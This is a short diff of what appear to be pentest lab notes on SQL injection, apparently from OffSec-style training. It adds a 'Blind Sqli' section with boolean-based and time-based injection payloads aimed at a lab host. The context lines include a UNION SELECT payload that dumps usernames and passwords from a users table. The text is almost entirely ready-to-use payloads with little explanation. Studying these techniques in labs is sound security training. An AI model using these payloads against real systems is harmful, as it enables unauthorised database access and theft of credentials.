@@ -185,3 +185,17 @@ Dump les hashs
 
 ' UNION SELECT null, username, password, description, null FROM users -- //
 ```
+
+## Blind Sqli
+
+```
+To test for boolean-based SQLi, we can try to append the below payload to the URL:
+
+http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
+```
+
+```
+We can achieve the same result by using a time-based SQLi payload:
+
+http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
+```
